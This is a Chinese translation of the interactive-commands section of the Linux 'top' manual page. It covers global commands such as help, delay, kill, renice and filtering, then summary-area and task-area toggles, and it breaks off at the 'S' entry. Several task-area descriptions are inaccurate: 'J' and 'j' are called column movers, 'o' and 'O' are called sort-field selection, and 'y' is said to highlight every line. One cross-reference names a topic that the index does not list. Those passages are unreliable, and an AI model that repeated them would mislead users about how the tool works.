\u6ce8\u610f\uff1a\u5982\u679c\u901a\u8fc7\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\u8fdb\u884c\u7684\u4efb\u4f55\u5b57\u6bb5\u66f4\u6539\uff0c\u4efb\u4f55\u5df2\u6c34\u5e73\u6eda\u52a8\u7684\u7a97\u53e3\u5c06\u88ab\u91cd\u7f6e\u3002\u7136\u800c\uff0c\u4efb\u4f55\u5782\u76f4\u6eda\u52a8\u7684\u4f4d\u7f6e\u5c06\u4e0d\u4f1a\u53d7\u5230\u5f71\u54cd\u3002 \u6709\u5173\u5782\u76f4\u548c\u6c34\u5e73\u6eda\u52a8\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 5c. \u7a97\u53e3\u6eda\u52a8\u3002 4. \u4ea4\u4e92\u547d\u4ee4 \u4ee5\u4e0b\u662f\u547d\u4ee4\u7684\u7b80\u8981\u7d22\u5f15\uff0c\u6309\u7c7b\u522b\u5206\u7c7b\u3002\u6709\u4e9b\u547d\u4ee4\u51fa\u73b0\u4e0d\u6b62\u4e00\u6b21\u2014\u2014\u5b83\u4eec\u7684\u542b\u4e49\u6216\u8303\u56f4\u53ef\u80fd\u4f1a\u6839\u636e\u53d1\u51fa\u547d\u4ee4\u7684\u4e0a\u4e0b\u6587\u800c\u6709\u6240\u4e0d\u540c\u3002 4a. \u5168\u5c40\u547d\u4ee4 <Ent/Sp> ?, =, 0, A, B, d, E, e, g, h, H, I, k, q, r, s, W, X, Y, Z 4b. \u6458\u8981\u533a\u57df\u547d\u4ee4 C, l, t, m, 1, 2, 3, 4, ! 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4 \u5916\u89c2: b, J, j, x, y, z \u5185\u5bb9: c, f, F, o, O, S, u, U, V, v \u5927\u5c0f: #, i, n \u6392\u5e8f: <, >, f, F, R 4d. \u989c\u8272\u6620\u5c04 <Ret>, a, B, b, H, M, q, S, T, w, z, 0 - 7 5b. \u7a97\u53e3\u547d\u4ee4 -, _, =, +, A, a, g, G, w 5c. \u7a97\u53e3\u6eda\u52a8 C, Up, Dn, Left, Right, PgUp, PgDn, Home, End 5d. \u7a97\u53e3\u641c\u7d22 L, & 4a. \u5168\u5c40\u547d\u4ee4 \u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u59cb\u7ec8\u53ef\u7528\u5168\u5c40\u4ea4\u4e92\u547d\u4ee4\u3002\u7136\u800c\uff0c\u5728\u5b89\u5168\u6a21\u5f0f\u4e0b\uff0c\u67d0\u4e9b\u4ea4\u4e92\u547d\u4ee4\u4e0d\u53ef\u7528\u3002 \u5982\u679c\u4f60\u60f3\u63d0\u524d\u77e5\u9053\u4f60\u7684 top \u662f\u5426\u5df2\u88ab\u5b89\u5168\uff0c\u8bf7\u8bf7\u6c42\u5e2e\u52a9\u5e76\u67e5\u770b\u7b2c\u4e8c\u884c\u4e0a\u7684\u7cfb\u7edf\u6458\u8981\u3002 <Enter> \u6216 <Space> :\u5237\u65b0\u663e\u793a \u8fd9\u4e9b\u547d\u4ee4\u5524\u9192 top\uff0c\u5e76\u5728\u6536\u5230\u4efb\u4f55\u8f93\u5165\u540e\u91cd\u65b0\u7ed8\u5236\u6574\u4e2a\u663e\u793a\u3002\u5b83\u4eec\u8fd8\u5f3a\u5236\u66f4\u65b0\u4efb\u4f55\u70ed\u63d2\u62d4\u7684 CPU \u6216\u7269\u7406\u5185\u5b58\u53d8\u5316\u3002 \u5982\u679c\u4f60\u6709\u4e00\u4e2a\u8f83\u5927\u7684\u5ef6\u8fdf\u95f4\u9694\uff0c\u5e76\u5e0c\u671b\u67e5\u770b\u5f53\u524d\u72b6\u6001\uff0c\u8bf7\u4f7f\u7528\u5176\u4e2d\u4efb\u4f55\u4e00\u4e2a\u952e\uff0c ? | h :\u5e2e\u52a9 \u6709\u4e24\u4e2a\u5e2e\u52a9\u7ea7\u522b\u53ef\u7528\u3002\u7b2c\u4e00\u4e2a\u5c06\u63d0\u4f9b\u6240\u6709\u57fa\u672c\u4ea4\u4e92\u547d\u4ee4\u7684\u63d0\u9192\u3002\u5982\u679c top \u88ab\u4fdd\u62a4\uff0c\u8be5\u5c4f\u5e55\u5c06\u88ab\u7f29\u77ed\u3002 \u5728\u8be5\u5e2e\u52a9\u5c4f\u5e55\u4e0a\u952e\u5165 `h` \u6216 `?` \u5c06\u5e26\u4f60\u8fdb\u5165\u9002\u7528\u4e8e\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u7684\u4ea4\u4e92\u547d\u4ee4\u7684\u5e2e\u52a9\u3002 = :\u9000\u51fa\u663e\u793a\u9650\u5236 \u5220\u9664\u663e\u793a\u5185\u5bb9\u7684\u9650\u5236\u3002\u6b64\u547d\u4ee4\u5c06\u53cd\u8f6c\u4efb\u4f55 `i`\uff08\u7a7a\u95f2\u4efb\u52a1\uff09\u3001`n`\uff08\u6700\u5927\u4efb\u52a1\uff09\u548c `v`\uff08\u9690\u85cf\u5b50\u8fdb\u7a0b\uff09\u547d\u4ee4\u3002 \u5b83\u8fd8\u63d0\u4f9b\u9000\u51fa PID \u76d1\u63a7\u3001\u7528\u6237\u8fc7\u6ee4\u3001\u5176\u4ed6\u8fc7\u6ee4\u3001\u5b9a\u4f4d\u5904\u7406\u548c\u7ec4\u5408 CPU \u6a21\u5f0f\u3002 \u6b64\u5916\uff0c\u5982\u679c\u7a97\u53e3\u5df2\u6eda\u52a8\uff0c\u5c06\u4f7f\u7528\u6b64\u547d\u4ee4\u91cd\u7f6e\u3002 0 :\u96f6\u6291\u5236\u5207\u6362 \u6b64\u547d\u4ee4\u786e\u5b9a\u662f\u5426\u663e\u793a\u8bb8\u591a\u5b57\u6bb5\u4e2d\u7684\u96f6\u3002\u50cf UID\u3001GID\u3001NI\u3001PR \u6216 P \u7b49\u5b57\u6bb5\u4e0d\u53d7\u6b64\u5207\u6362\u7684\u5f71\u54cd\u3002 A :\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5728\u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e4b\u95f4\u5207\u6362\u3002\u8bf7\u53c2\u89c1\u4e3b\u9898 5. \u66ff\u4ee3\u663e\u793a\u9009\u9879\u548c `g` \u4ea4\u4e92\u547d\u4ee4\uff0c \u4e86\u89e3\u201c\u5f53\u524d\u201d\u7a97\u53e3\u548c\u5b57\u6bb5\u7ec4\u7684\u8be6\u7ec6\u4fe1\u606f\u3002 B :\u52a0\u7c97\u7981\u7528/\u542f\u7528\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5f71\u54cd\u7c97\u4f53 terminfo \u529f\u80fd\u7684\u4f7f\u7528\uff0c\u5e76\u6539\u53d8\u201c\u5f53\u524d\u201d\u7a97\u53e3\u7684\u6458\u8981\u533a\u57df\u548c\u4efb\u52a1\u533a\u57df\u3002\u867d\u7136\u4e3b\u8981\u7528\u4e8e\u54d1\u7ec8\u7aef\uff0c \u4f46\u53ef\u4ee5\u968f\u65f6\u5e94\u7528\u3002 \u6ce8\u610f\uff1a\u5f53\u6b64\u5207\u6362\u5f00\u542f\u4e14 top \u5728\u5355\u8272\u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff0c\u6574\u4e2a\u663e\u793a\u5c06\u663e\u793a\u4e3a\u666e\u901a\u6587\u672c\u3002\u56e0\u6b64\uff0c\u9664\u975e `x` \u548c/\u6216 `y` \u5207\u6362\u4f7f\u7528\u53cd\u8f6c\u4ee5\u5f3a\u8c03\uff0c\u5426\u5219\u5c06\u6ca1\u6709\u89c6\u89c9\u786e\u8ba4\u5b83\u4eec\u662f\u5426\u5f00\u542f\u3002 * d | s :\u66f4\u6539\u5ef6\u8fdf\u65f6\u95f4\u95f4\u9694 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u663e\u793a\u66f4\u65b0\u4e4b\u95f4\u7684\u5ef6\u8fdf\u65f6\u95f4\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002 \u5206\u6570\u79d2\u662f\u6709\u6548\u7684\uff0c\u4f46\u4e0d\u5141\u8bb8\u8d1f\u6570\u3002\u8f93\u5165 0 \u4f1a\u5bfc\u81f4\uff08\u51e0\u4e4e\uff09\u8fde\u7eed\u66f4\u65b0\uff0c\u56e0\u4e3a\u7cfb\u7edf\u548c tty \u9a71\u52a8\u7a0b\u5e8f\u5c1d\u8bd5\u8ddf\u4e0a top \u7684\u9700\u6c42\uff0c\u663e\u793a\u5c06\u4e0d\u6ee1\u610f\u3002 \u5ef6\u8fdf\u503c\u4e0e\u7cfb\u7edf\u8d1f\u8f7d\u6210\u53cd\u6bd4\uff0c\u56e0\u6b64\u8bf7\u8c28\u614e\u8bbe\u7f6e\u3002 \u5982\u679c\u4f60\u60f3\u968f\u65f6\u77e5\u9053\u5f53\u524d\u7684\u5ef6\u8fdf\u65f6\u95f4\uff0c\u53ea\u9700\u8bf7\u6c42\u5e2e\u52a9\u5e76\u67e5\u770b\u7b2c\u4e8c\u884c\u4e0a\u7684\u7cfb\u7edf\u6458\u8981\u3002 E :\u5f3a\u5236\u6458\u8981\u5185\u5b58\u7f29\u653e \u4f7f\u7528\u6b64\u547d\u4ee4\u53ef\u4ee5\u5faa\u73af\u6458\u8981\u533a\u57df\u7684\u5185\u5b58\u7f29\u653e\uff0c\u8303\u56f4\u4ece KiB\uff08\u5343\u5b57\u8282\u6216 1024 \u5b57\u8282\uff09\u5230 EiB\uff08\u827e\u5b57\u8282\u6216 1,152,921,504,606,846,976 \u5b57\u8282\uff09\u3002 \u5982\u679c\u4f60\u5728\u663e\u793a\u7684\u6570\u5b57\u548c\u540e\u9762\u7684\u6807\u7b7e\u4e4b\u95f4\u770b\u5230\u4e00\u4e2a `+`\uff0c\u8fd9\u610f\u5473\u7740 top \u88ab\u8feb\u622a\u65ad\u4e86\u8be5\u6570\u5b57\u7684\u4e00\u90e8\u5206\u3002\u901a\u8fc7\u63d0\u9ad8\u7f29\u653e\u56e0\u5b50\uff0c\u53ef\u4ee5\u907f\u514d\u8fd9\u79cd\u622a\u65ad\u3002 e :\u5f3a\u5236\u4efb\u52a1\u5185\u5b58\u7f29\u653e \u4f7f\u7528\u6b64\u547d\u4ee4\u53ef\u4ee5\u5faa\u73af\u4efb\u52a1\u533a\u57df\u7684\u5185\u5b58\u7f29\u653e\uff0c\u8303\u56f4\u4ece KiB\uff08\u5343\u5b57\u8282\u6216 1024 \u5b57\u8282\uff09\u5230 PiB\uff08\u62cd\u5b57\u8282\u6216 1,125,899,906,842,624 \u5b57\u8282\uff09\u3002 \u867d\u7136 top \u5c06\u5c3d\u529b\u9075\u5b88\u9009\u5b9a\u7684\u76ee\u6807\u8303\u56f4\uff0c\u4f46\u4e3a\u4e86\u9002\u5e94\u5f53\u524d\u503c\uff0c\u53ef\u80fd\u4ecd\u9700\u8981\u989d\u5916\u7684\u7f29\u653e\u3002\u5982\u679c\u4f60\u5e0c\u671b\u5728\u5185\u5b58\u5217\u4e2d\u770b\u5230\u66f4\u5747\u5300\u7684\u7ed3\u679c\uff0c\u63d0\u9ad8\u7f29\u653e\u8303\u56f4\u901a\u5e38\u53ef\u4ee5\u5b9e\u73b0\u8be5\u76ee\u6807\u3002 \u4f46\u5982\u679c\u63d0\u9ad8\u8fc7\u9ad8\uff0c\u53ef\u80fd\u4f1a\u4ea7\u751f\u5168\u96f6\u7ed3\u679c\uff0c\u65e0\u6cd5\u4f7f\u7528 `0` \u4ea4\u4e92\u547d\u4ee4\u6291\u5236\u3002 g :\u9009\u62e9\u5176\u4ed6\u7a97\u53e3/\u5b57\u6bb5\u7ec4 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u4ecb\u4e8e 1 \u548c 4 \u4e4b\u95f4\u7684\u6570\u5b57\uff0c\u4ee5\u6307\u5b9a\u5e94\u4f5c\u4e3a\u201c\u5f53\u524d\u201d\u7a97\u53e3\u7684\u5b57\u6bb5\u7ec4\u3002\u968f\u7740\u4f60\u5bf9\u8fd9 4 \u4e2a\u7a97\u53e3\u7684\u719f\u6089\uff0c \u7279\u522b\u662f\u5728\u5c1d\u8bd5\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u540e\uff0c\u4f60\u4f1a\u5f88\u5feb\u719f\u6089\u8fd9\u4e9b\u7a97\u53e3\u3002 H :\u7ebf\u7a0b\u6a21\u5f0f\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0c\u5c06\u663e\u793a\u6240\u6709\u8fdb\u7a0b\u7684\u5355\u4e2a\u7ebf\u7a0b\u3002\u5426\u5219\uff0ctop \u663e\u793a\u6bcf\u4e2a\u8fdb\u7a0b\u4e2d\u6240\u6709\u7ebf\u7a0b\u7684\u6c47\u603b\u3002 I :Irix/Solaris \u6a21\u5f0f\u5207\u6362 \u5f53\u5728 Solaris \u6a21\u5f0f\u4e0b\u8fd0\u884c\u65f6\uff08`I` \u5207\u6362\u5173\u95ed\uff09\uff0c\u4efb\u52a1\u7684 CPU \u4f7f\u7528\u91cf\u5c06\u9664\u4ee5 CPU \u603b\u6570\u3002\u53d1\u51fa\u6b64\u547d\u4ee4\u540e\uff0c\u4f60\u5c06\u88ab\u544a\u77e5\u6b64\u5207\u6362\u7684\u65b0\u72b6\u6001\u3002 * k :\u6740\u6b7b\u4efb\u52a1 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a PID\uff0c\u7136\u540e\u662f\u8981\u53d1\u9001\u7684\u4fe1\u53f7\u3002 \u4e0d\u8f93\u5165 PID \u6216\u8f93\u5165\u8d1f\u6570\u5c06\u88ab\u89e3\u91ca\u4e3a\u63d0\u793a\u4e2d\u663e\u793a\u7684\u9ed8\u8ba4\u503c\uff08\u663e\u793a\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1\uff09\u3002PID \u503c\u4e3a\u96f6\u8868\u793a top \u7a0b\u5e8f\u672c\u8eab\u3002 \u9ed8\u8ba4\u4fe1\u53f7\u5982\u63d0\u793a\u4e2d\u6240\u793a\u662f SIGTERM\u3002\u7136\u800c\uff0c\u4f60\u53ef\u4ee5\u901a\u8fc7\u6570\u5b57\u6216\u540d\u79f0\u53d1\u9001\u4efb\u4f55\u4fe1\u53f7\u3002 \u5982\u679c\u4f60\u5e0c\u671b\u4e2d\u6b62\u6740\u6b7b\u8fdb\u7a0b\u7684\u64cd\u4f5c\uff0c\u8bf7\u6839\u636e\u8fdb\u5ea6\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\u4e4b\u4e00\uff1a 1) \u5728 PID \u63d0\u793a\u4e2d\uff0c\u952e\u5165\u65e0\u6548\u6570\u5b57 2) \u5728\u4fe1\u53f7\u63d0\u793a\u4e2d\uff0c\u952e\u5165 0\uff08\u6216\u4efb\u4f55\u65e0\u6548\u4fe1\u53f7\uff09 3) \u5728\u4efb\u4f55\u63d0\u793a\u4e2d\uff0c\u952e\u5165 <Esc> q :\u9000\u51fa * r :\u8c03\u6574\u4efb\u52a1\u4f18\u5148\u7ea7 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a PID\uff0c\u7136\u540e\u662f\u8981\u8c03\u6574\u7684\u4f18\u5148\u503c\u3002 \u4e0d\u8f93\u5165 PID \u6216\u8f93\u5165\u8d1f\u6570\u5c06\u88ab\u89e3\u91ca\u4e3a\u63d0\u793a\u4e2d\u663e\u793a\u7684\u9ed8\u8ba4\u503c\uff08\u663e\u793a\u7684\u7b2c\u4e00\u4e2a\u4efb\u52a1\uff09\u3002PID \u503c\u4e3a\u96f6\u8868\u793a top \u7a0b\u5e8f\u672c\u8eab\u3002 \u6b63\u7684\u4f18\u5148\u503c\u5c06\u4f7f\u8fdb\u7a0b\u964d\u4f4e\u4f18\u5148\u7ea7\u3002\u76f8\u53cd\uff0c\u8d1f\u7684\u4f18\u5148\u503c\u5c06\u4f7f\u8fdb\u7a0b\u66f4\u53d7\u5185\u6838\u9752\u7750\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u666e\u901a\u7528\u6237\u53ea\u80fd\u589e\u52a0\u4f18\u5148\u503c\uff0c\u65e0\u6cd5\u964d\u4f4e\u3002 \u5982\u679c\u4f60\u5e0c\u671b\u4e2d\u6b62\u8c03\u6574\u4f18\u5148\u7ea7\u7684\u64cd\u4f5c\uff0c\u8bf7\u6839\u636e\u8fdb\u5ea6\u6267\u884c\u4ee5\u4e0b\u64cd\u4f5c\u4e4b\u4e00\uff1a 1) \u5728 PID \u63d0\u793a\u4e2d\uff0c\u952e\u5165\u65e0\u6548\u6570\u5b57 2) \u5728\u4f18\u5148\u503c\u63d0\u793a\u4e2d\uff0c\u6309 <Enter> \u952e\u4e0d\u8f93\u5165\u4efb\u4f55\u5185\u5bb9 3) \u5728\u4efb\u4f55\u63d0\u793a\u4e2d\uff0c\u952e\u5165 <Esc> W :\u5199\u5165\u914d\u7f6e\u6587\u4ef6 \u8fd9\u5c06\u4fdd\u5b58\u6240\u6709\u9009\u9879\u548c\u5207\u6362\u52a0\u4e0a\u5f53\u524d\u663e\u793a\u6a21\u5f0f\u548c\u5ef6\u8fdf\u65f6\u95f4\u3002\u901a\u8fc7\u5728\u9000\u51fa top \u4e4b\u524d\u53d1\u51fa\u6b64\u547d\u4ee4\uff0c\u4f60\u5c06\u80fd\u591f\u5728\u5b8c\u5168\u76f8\u540c\u7684\u72b6\u6001\u4e0b\u91cd\u65b0\u542f\u52a8\u3002 X :\u989d\u5916\u56fa\u5b9a\u5bbd\u5ea6 \u67d0\u4e9b\u5b57\u6bb5\u662f\u56fa\u5b9a\u5bbd\u5ea6\u7684\uff0c\u4e0d\u53ef\u7f29\u653e\u3002\u56e0\u6b64\uff0c\u5b83\u4eec\u53ef\u80fd\u4f1a\u88ab\u622a\u65ad\uff0c\u8868\u793a\u4e3a\u6700\u540e\u4e00\u4e2a\u4f4d\u7f6e\u7684 `+`\u3002 \u6b64\u4ea4\u4e92\u547d\u4ee4\u53ef\u7528\u4e8e\u66f4\u6539\u4ee5\u4e0b\u5b57\u6bb5\u7684\u5bbd\u5ea6\uff1a \u5b57\u6bb5 \u9ed8\u8ba4 \u5b57\u6bb5 \u9ed8\u8ba4 \u5b57\u6bb5 \u9ed8\u8ba4 GID 5 GROUP 8 WCHAN 10 RUID 5 LXC 8 nsIPC 10 SUID 5 RUSER 8 nsMNT 10 UID 5 SUSER 8 nsNET 10 TTY 8 nsPID 10 USER 8 nsUSER 10 nsUTS 10 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u8981 \u66f4\u6539\u7684\u5b57\u6bb5\u540d\u3002\u53ef\u4ee5\u63d0\u4f9b\u4efb\u4f55\u6709\u6548\u7684\u56fa\u5b9a\u5bbd\u5ea6\u5b57\u6bb5\u540d\u79f0\uff0c\u6216\u952e\u5165 <Esc> \u9000\u51fa\u6b64\u547d\u4ee4\u3002\u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u4ecb\u4e8e 1 \u548c 40 \u4e4b\u95f4\u7684\u6570\u5b57\u3002\u8be5\u6570\u5b57\u51b3\u5b9a\u65b0\u5bbd\u5ea6\uff0c\u5e76\u7acb\u5373\u5e94\u7528\u3002 Y :\u5176\u4ed6\u8fc7\u6ee4 \u4f7f\u7528\u6b64\u547d\u4ee4\u53ef\u4ee5\u8f7b\u677e\u5bf9\u4efb\u52a1\u8fdb\u884c\u4e34\u65f6\u8fc7\u6ee4\u3002 \u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u5b57\u6bb5\u540d\uff08\u4f8b\u5982\uff0c'COMMAND'\uff09\u3002\u5982\u679c\u5b57\u6bb5\u540d\u65e0\u6548\uff0c\u5f53\u524d\u7a97\u53e3\u7684\u6240\u6709\u5b57\u6bb5\u540d\u5c06\u4f5c\u4e3a\u4e0a\u4e0b\u6587\u63d0\u793a\u8fdb\u884c\u663e\u793a\u3002 \u8f93\u5165\u5b57\u6bb5\u540d\u540e\uff0c\u4f60\u5c06\u88ab\u63d0\u793a\u8f93\u5165\u4e00\u4e2a\u503c\u3002\u8be5\u503c\u5c06\u4e0e\u5b57\u6bb5\u7684\u5185\u5bb9\u8fdb\u884c\u6bd4\u8f83\uff0c\u53ea\u6709\u90a3\u4e9b\u5339\u914d\u7684\u4efb\u52a1\u624d\u4f1a\u88ab\u663e\u793a\u3002 \u6709\u5173\u6b64\u547d\u4ee4\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1 `&` \u4ea4\u4e92\u547d\u4ee4\u548c\u4e3b\u9898 5e. \u7a97\u53e3\u641c\u7d22\u3002 Z :\u989c\u8272\u6620\u5c04\u5f00\u5173 \u4f60\u5c06\u88ab\u63d0\u793a\u9009\u62e9\u4e00\u4e2a\u989c\u8272\u6620\u5c04\u3002\u5982\u679c\u7981\u7528\u989c\u8272\u6620\u5c04\uff0c\u5c06\u4e0d\u4f1a\u663e\u793a\u4efb\u4f55\u989c\u8272\u3002 \u53ef\u4ee5\u4f7f\u7528 0 \u5230 7 \u4e4b\u95f4\u7684\u6570\u5b57\u9009\u62e9\u989c\u8272\u6620\u5c04\u3002\u76f8\u5173\u63d0\u793a\u5c06\u663e\u793a\u5f53\u524d\u4f7f\u7528\u7684\u989c\u8272\u6620\u5c04\u548c\u53ef\u7528\u7684\u989c\u8272\u6620\u5c04\u3002 \u6709\u5173\u6b64\u547d\u4ee4\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u8bf7\u53c2\u89c1\u4e3b\u9898 4d. \u989c\u8272\u6620\u5c04\u3002 4b. \u6458\u8981\u533a\u57df\u547d\u4ee4 \u6458\u8981\u533a\u57df\u547d\u4ee4\u53ea\u5f71\u54cd\u7a97\u53e3\u7684\u6458\u8981\u90e8\u5206\u3002\u5b83\u4eec\u5728\u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u5747\u53ef\u7528\u3002 C :\u7528\u6237\u548c\u7ec4 ID \u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5f71\u54cd\u4efb\u52a1\u533a\u57df\u4e2d\u663e\u793a\u7684\u7528\u6237\u548c\u7ec4 ID\u3002\u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0ctop \u663e\u793a\u4efb\u52a1\u7684\u7528\u6237\u540d\u548c\u7ec4\u540d\u3002\u6b64\u5207\u6362\u5c06\u5b83\u4eec\u5207\u6362\u4e3a\u5b9e\u9645 ID\u3002 l :\u8d1f\u8f7d\u5e73\u5747\u503c\u548c\u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u8d1f\u8f7d\u5e73\u5747\u503c\u548c\u7cfb\u7edf\u8fd0\u884c\u65f6\u95f4\u3002 t :\u4efb\u52a1\u548c CPU \u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u4efb\u52a1\u548c CPU \u72b6\u6001\u3002 m :\u5185\u5b58\u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u9690\u85cf\u6216\u663e\u793a\u663e\u793a\u7a97\u53e3\u9876\u90e8\u7684\u5185\u5b58\u72b6\u6001\u3002 1 :\u5355/\u591a CPU \u72b6\u6001\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5355\u4e2a CPU \u7684\u72b6\u6001\u663e\u793a\u5207\u6362\u4e3a\u6240\u6709 CPU \u7684\u72b6\u6001\u663e\u793a\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 2 :NUMA \u8282\u70b9\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2a CPU \u72b6\u6001\u884c\u7684\u663e\u793a\u987a\u5e8f\u5c06\u9075\u5faa NUMA \u8282\u70b9\u7684\u987a\u5e8f\u3002\u6b64\u987a\u5e8f\u5728 NUMA \u673a\u5668\u4e0a\u53ef\u80fd\u4f1a\u6709\u6240\u4e0d\u540c\u3002 3 :NUMA \u8282\u70b9\u989c\u8272\u6620\u5c04\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0c\u6bcf\u4e2a CPU \u72b6\u6001\u884c\u5c06\u4f7f\u7528\u4e0d\u540c\u7684\u989c\u8272\u6620\u5c04\uff0c\u4ee5\u4fbf\u66f4\u5bb9\u6613\u533a\u5206\u3002 4 :NUMA \u8282\u70b9\u5e03\u5c40\u5207\u6362 \u5f53\u6b64\u5207\u6362\u5f00\u542f\u65f6\uff0cCPU \u72b6\u6001\u884c\u5c06\u6839\u636e NUMA \u8282\u70b9\u8fdb\u884c\u5206\u7ec4\u548c\u663e\u793a\u3002 ! :\u4ea4\u4e92\u547d\u4ee4\u53d6\u6d88 \u6b64\u547d\u4ee4\u5c06\u53d6\u6d88\u4efb\u4f55\u672a\u5b8c\u6210\u7684\u4ea4\u4e92\u547d\u4ee4\uff0c\u5e76\u8fd4\u56de\u5230\u6b63\u5e38\u7684 top \u64cd\u4f5c\u3002 4c. \u4efb\u52a1\u533a\u57df\u547d\u4ee4 \u4efb\u52a1\u533a\u57df\u547d\u4ee4\u53ea\u5f71\u54cd\u7a97\u53e3\u7684\u4efb\u52a1\u663e\u793a\u90e8\u5206\u3002\u5b83\u4eec\u5728\u5168\u5c4f\u6a21\u5f0f\u548c\u66ff\u4ee3\u663e\u793a\u6a21\u5f0f\u4e0b\u5747\u53ef\u7528\u3002 \u5916\u89c2: b :\u7c97\u4f53\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u5f71\u54cd\u7c97\u4f53 terminfo \u529f\u80fd\u7684\u4f7f\u7528\uff0c\u5e76\u6539\u53d8\u4efb\u52a1\u533a\u57df\u7684\u663e\u793a\u3002 J :\u5217\u79fb\u52a8 \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u9009\u62e9\u7684\u5217\u79fb\u52a8\u5230\u4e0b\u4e00\u4e2a\u4f4d\u7f6e\u3002 j :\u5217\u79fb\u52a8 \u6b64\u547d\u4ee4\u5c06\u5f53\u524d\u9009\u62e9\u7684\u5217\u79fb\u52a8\u5230\u4e0a\u4e00\u4e2a\u4f4d\u7f6e\u3002 x :\u5f53\u524d\u6392\u5e8f\u5b57\u6bb5\u7a81\u51fa\u663e\u793a\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u7a81\u51fa\u663e\u793a\u5f53\u524d\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 y :\u4efb\u52a1\u7a97\u53e3\u884c\u7a81\u51fa\u663e\u793a\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u7a81\u51fa\u663e\u793a\u4efb\u52a1\u7a97\u53e3\u4e2d\u7684\u6bcf\u4e00\u884c\u3002 z :\u4efb\u52a1\u7a97\u53e3\u989c\u8272\u6620\u5c04\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7a97\u53e3\u5207\u6362\u4e3a\u4f7f\u7528\u4e0d\u540c\u7684\u989c\u8272\u6620\u5c04\u3002 \u5185\u5bb9: c :\u547d\u4ee4\u884c/\u7a0b\u5e8f\u540d\u79f0\u5207\u6362 \u6b64\u547d\u4ee4\u5c06\u4efb\u52a1\u7684\u547d\u4ee4\u884c\u663e\u793a\u5207\u6362\u4e3a\u7a0b\u5e8f\u540d\u79f0\uff0c\u53cd\u4e4b\u4ea6\u7136\u3002 f :\u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u54ea\u4e9b\u5b57\u6bb5\u663e\u793a\uff0c\u54ea\u4e9b\u5b57\u6bb5\u7528\u4e8e\u6392\u5e8f\u3002 F :\u5b57\u6bb5\u7ba1\u7406 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u5b57\u6bb5\u7ba1\u7406\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u54ea\u4e9b\u5b57\u6bb5\u663e\u793a\uff0c\u54ea\u4e9b\u5b57\u6bb5\u7528\u4e8e\u6392\u5e8f\u3002 o :\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 O :\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9 \u6b64\u547d\u4ee4\u5c06\u8fdb\u5165\u6392\u5e8f\u5b57\u6bb5\u9009\u62e9\u5c4f\u5e55\uff0c\u5141\u8bb8\u4f60\u9009\u62e9\u7528\u4e8e\u6392\u5e8f\u7684\u5b57\u6bb5\u3002 S :\u7d2f\u79ef\u65f6\u95f4\u5207\u6362 